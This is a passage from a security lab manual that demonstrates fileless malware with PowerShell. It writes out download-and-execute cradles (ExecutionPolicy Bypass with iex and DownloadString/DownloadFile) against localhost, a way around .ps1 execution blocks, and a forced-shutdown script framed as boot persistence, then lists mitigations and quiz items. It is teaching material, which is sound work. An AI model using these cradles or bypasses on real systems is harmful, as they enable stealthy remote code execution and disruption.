
there is a check in the checkbox next to File Name Extensions in the Show/Hide tab.

- e. Right-click a blank area in the www folder, select New, select Text Document, and rename the file **script2.ps1**. Make sure you get rid of the .txt extension at the end, which is not highlighted by default. Click the Yes button to the "If you change a file name extension, the file might become unusable. Are you sure you want to change it?" dialog box message.

- f. Double-click the file to open it up in Notepad. Put just **Get-Service** in the file and then save it and exit Notepad.

- g. The loopback address of 127.0.0.1 (referring to localhost, the current machine) will be used in place of a possible adversary's IP address or fully qualified domain name (FQDN) in the following command. The **-NoExit** switch is being used here to keep the window open so you can examine the output and create the screenshots. Otherwise, when the command and output complete, the window would close automatically. Attackers, though, wouldn't use this particular switch, so they can stay as stealthy as possible. Execute the following command and all other commands in this step from either the Start menu or the search box:

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoExit -Command "iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/script2.ps1')"
  ```

  The output shows a list of services on the system.

- h. Create script3.ps1 in the www directory with only **Get-Process** in it. Run this command:

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoExit -Command "iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/script3.ps1')"
  ```

  The output shows a list of processes on the system.

Instead of downloading to RAM and running from RAM, a script or malware can be downloaded to the hard drive and immediately run from there. The desktop has been chosen as the destination location for the downloaded scripts for this and future examples for ease of use. Attackers would choose a more covert location on the hard drive in an actual attack.

- i. Put just the word **date** in a file called script4.ps1, in the www directory, and run the following command, which uses the **DownloadFile** function instead of the **DownloadString** function we've been using thus far:

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/script4.ps1',
  'C:\Users\%USERNAME%\Desktop\script4.ps1'); iex
  'C:\Users\%USERNAME%\Desktop\script4.ps1'
  ```

- j. Now put these two lines in script5.ps1:

  ```powershell
  Copy-Item "C:\Windows\System32\calc.exe" "C:\Users\$env:USERNAME\Desktop"
  & "C:\Windows\System32\calc.exe"
  ```

  The **Copy-Item** cmdlet copies from a source location to a destination location. In this case, we're copying the Calculator program from C:\Windows\System32 to the current user's desktop. The desktop location has been chosen for ease of use. Adversaries would choose a more covert location on the hard drive in an actual attack. Notice that the **%USERNAME%** reference used before has been changed to the PowerShell format, since the variable is being used within a PowerShell script this time.

  The call operator, **&**, executes the command to launch Calculator.

  Run the following command, and just imagine that calc.exe was an actual malware specimen ready to launch at an attacker's whim!

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/script5.ps1',
  'C:\Users\%USERNAME%\Desktop\script5.ps1'); iex
  'C:\Users\%USERNAME%\Desktop\script5.ps1'
  ```

- k. Put the following in script6.ps1:

  ```powershell
  & "C:\Program Files\Google\Chrome\Application\chrome.exe" www.rit.edu/directory/jswics-jonathan-weissman
  ```

  Depending on when you installed Chrome, chrome.exe might be

What if a systems administrator prevents execution from files that have a .ps1 extension? No problem! Attackers can sidestep that by using the **Get-Content** cmdlet to access the contents of a file with another extension (there's no way to filter by every possibility, which is an infinite number of extensions) and then send the contents to the **Invoke-Expression** cmdlet to be executed. Try this one:

```powershell
powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/script8.ps2',
'C:\Users\%USERNAME%\Desktop\script8.ps2'); Get-Content
'C:\Users\%USERNAME%\Desktop\script8.ps2' | iex
```

- n. Put the following in script9.ps1:

  ```powershell
  Stop-Computer -ComputerName 127.0.0.1
  ```

  Before you run this command, save anything that needs to be saved. This command is about to shut down your machine.

An attacker can then add a registry entry that calls this file every time the system boots up, which will immediately make it...shut down! Now run this:

```powershell
powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/script9.ps1',
'C:\Users\%USERNAME%\Desktop\script9.ps1'); iex
'C:\Users\%USERNAME%\Desktop\script9.ps1'
```

How can we mitigate this great risk that fileless malware through PowerShell presents?

Make sure that there is real-time monitoring of systems and networks. Make sure logs and alerts are in place. Make sure that updates and security patches are applied in a timely fashion. Make sure that the principle of least privilege is applied, where users and programs have just what they need to do their jobs and not a drop more. Make sure user education and training is provided so employees know what they should do and what they shouldn't do.

Fileless malware attacks place value on stealth, rather than persistence, though the flexibility of the attack to pair with other malware allows it to have both. The Ponemon Institute survey found that these memory-based attacks were 10 times more likely to succeed than file-based malware.

Organizations should create a strategy, including both endpoint security solutions and employee training, to combat against these threats.

### Lab Analysis

- 1. What is fileless malware?
- 2. Why is PowerShell used for attacks involving fileless malware?
- 3. What are some risk management strategies related to PowerShell and fileless malware?

### Key Term Quiz

Use the terms from the list to complete the sentences that follow.

- DownloadString
- execution policy
- fileless malware
- PowerShell
- Restricted
- risk
- risk management
- scripts
- Unrestricted

- 1. A function that is responsible for putting scripts in RAM is ______________.
- 2. The default ______________ for ______________ is ______________.
- 3. User education and training can help reduce the ______________ for ______________ attacks, and it's a great part of ______________.
- 4. This chapter has demonstrated that a setting of ______________ for scripts is more realistic than the default, and it doesn't give a false sense of security.

## Chapter 22: Incident Response

### Lab Exercises

- 22.01 Incident Response Companies and Stories
- 22.02 Metasploit Framework
- 22.03 Metasploit's Meterpreter
- 22.04 Armitage

### Lab Analysis

### Key Term Quiz

The National Institute of Standards and Technology's (NIST) Computer Security Resource Center (CSRC) provides the following as one of the definitions of incident (https://csrc.nist.gov/glossary/term/incident):

> An occurrence that actually or potentially jeopardizes the confidentiality, integrity, or availability of an information system or the information the system processes, stores, or transmits or that constitutes a violation or imminent threat of violation of security policies, security procedures, or acceptable use policies.

Furthermore, incident response is defined by the NIST CSRC as "the mitigation of violations of security policies and recommended practices" (https://csrc.nist.gov/glossary/term/incident_response).

Incident response includes steps that an organization takes right after a cyberattack or data breach to contain the damage and preserve the evidence for forensics analysis as best as possible. If not done correctly, the restoration
